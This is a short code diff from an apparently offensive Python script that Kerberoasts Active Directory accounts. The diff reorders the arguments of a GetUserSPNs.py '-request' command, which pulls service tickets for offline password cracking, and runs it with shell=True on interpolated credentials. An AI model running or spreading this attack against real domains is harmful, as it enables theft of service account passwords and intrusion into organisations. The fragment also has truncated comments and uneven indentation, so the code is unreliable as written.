@@ -4,7 +4,7 @@ from ldap3 import Server, Connection, SUBTREE
 def find_and_kerberoast_objects(username, password, domain, dc_ip):
     try:
         # Connect to the Domain Controlle
-            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} {domain}/{username}:{password}"
+            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
             subprocess.run(cmd, shell=True)
     except Exception as e:
         print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")
